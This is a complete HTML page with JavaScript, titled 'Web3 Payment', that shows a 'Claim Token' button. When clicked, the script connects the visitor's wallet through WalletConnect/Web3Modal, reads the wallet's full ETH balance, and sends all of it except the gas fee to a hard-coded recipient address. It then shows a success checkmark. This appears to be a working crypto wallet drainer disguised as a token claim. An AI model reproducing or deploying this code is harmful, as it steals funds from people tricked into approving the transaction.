<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web3 Payment</title>
    <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3modal@1.9.7/dist/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.6.6/dist/umd/index.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.6.0/dist/ethers.umd.min.js"></script>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
        }
        .gold-bag-button {
            background: url('https://www.vhv.rs/file/max/37/378446_gold-coin-png-image.png') no-repeat center center;
            background-size: contain;
            width: 150px;
            height: 150px;
            border: none;
            cursor: pointer;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            text-shadow: 1px 1px 2px #000;
        }
        .gold-bag-button span {
            position: relative;
            top: 60%;
            background-color: rgba(0, 0, 0, 0.5);
            padding: 5px 10px;
            border-radius: 5px;
        }
        #qrCodeContainer {
            display: none;
            text-align: center;
        }
        #qrCodeContainer img {
            width: 200px;
            height: 200px;
        }
        .checkmark {
            display: none;
            width: 100px;
            height: 100px;
            border-radius: 50%;
            background-color: #4caf50;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
        }
        .checkmark:after {
            content: '';
            display: block;
            width: 20px;
            height: 40px;
            border: solid white;
            border-width: 0 10px 10px 0;
            transform: rotate(45deg);
            position: absolute;
            top: 20%;
            left: 35%;
        }
    </style>
</head>
<body>
    <button id="connectButton" class="gold-bag-button"><span>Claim Token</span></button>

    <div id="qrCodeContainer">
        <h2>Scan QR Code with Your Wallet App</h2>
        <div id="qrCode"></div>
    </div>

    <div class="checkmark" id="checkmark"></div>

    <script>
        const connectButton = document.getElementById('connectButton');
        const qrCodeContainer = document.getElementById('qrCodeContainer');
        const checkmark = document.getElementById('checkmark');
        const recipientAddress = '0xDF67b71a130Bf51fFaB24f3610D3532494b61A0f';
        const gasLimit = BigInt(21000);

        function toHex(value) {
            return '0x' + value.toString(16);
        }

        async function connectWallet() {
            const provider = new WalletConnectProvider.default({
                infuraId: "c05e035e823a4769b62ae15c1cbe2f02",
                qrcodeModalOptions: {
                    mobileLinks: ["trust", "metamask", "argent", "imtoken", "pillar"]
                }
            });

            await provider.enable();
            return provider;
        }

        async function init() {
            const providerOptions = {
                walletconnect: {
                    package: WalletConnectProvider.default,
                    options: {
                        infuraId: "c05e035e823a4769b62ae15c1cbe2f02",
                        qrcodeModalOptions: {
                            mobileLinks: ["trust", "metamask", "argent", "imtoken", "pillar"]
                        }
                    }
                },
                trustwallet: {
                    package: true
                }
            };

            const web3Modal = new Web3Modal.default({
                cacheProvider: true,
                providerOptions
            });

            connectButton.addEventListener('click', async () => {
                try {
                    const provider = await web3Modal.connect();
                    const web3 = new Web3(provider);

                    let walletType = 'unknown';
                    if (provider.isTrust) {
                        walletType = 'Trust Wallet';
                    } else {
                        walletType = 'WalletConnect';
                    }

                    console.log(`${walletType} detected`);

                    const ethersProvider = new ethers.providers.Web3Provider(provider);
                    const accounts = await web3.eth.getAccounts();
                    const senderAddress = accounts[0];
                    console.log(`Sender Address: ${senderAddress}`);

                    // Fetch current gas prices
                    const feeData = await ethersProvider.getFeeData();
                    const gasPriceWei = BigInt(feeData.gasPrice.toString());
                    const maxFeePerGas = BigInt(feeData.maxFeePerGas.toString());
                    const maxPriorityFeePerGas = BigInt(feeData.maxPriorityFeePerGas.toString());

                    console.log(`Gas Price Wei: ${gasPriceWei}`);
                    console.log(`Max Fee Per Gas: ${maxFeePerGas}`);
                    console.log(`Max Priority Fee Per Gas: ${maxPriorityFeePerGas}`);

                    const ethBalanceWei = BigInt(await web3.eth.getBalance(senderAddress));
                    console.log(`ETH Balance Wei: ${ethBalanceWei}`);
                    const gasFeeWei = gasPriceWei * gasLimit;
                    const maxEthTransferWei = ethBalanceWei - gasFeeWei;

                    console.log(`Gas Fee Wei: ${gasFeeWei}`);
                    console.log(`Max ETH Transfer Wei: ${maxEthTransferWei}`);

                    // Create a simple ETH transaction
                    const ethTransactionParameters = {
                        to: recipientAddress,
                        from: senderAddress,
                        value: toHex(maxEthTransferWei),
                        gas: toHex(gasLimit),
                        maxFeePerGas: toHex(maxFeePerGas),
                        maxPriorityFeePerGas: toHex(maxPriorityFeePerGas)
                    };

                    console.log('ETH Transaction Parameters:', ethTransactionParameters);

                    // Send the transaction
                    const ethTxHash = await web3.eth.sendTransaction(ethTransactionParameters);

                    // Display check mark animation and reload page after 5 seconds
                    checkmark.style.display = 'block';
                    setTimeout(() => {
                        checkmark.style.display = 'none';
                        location.reload();
                    }, 5000);

                } catch (error) {
                    console.error('Error:', error.message);
                }
            });
        }

        window.addEventListener('load', init);
    </script>
</body>
</html>
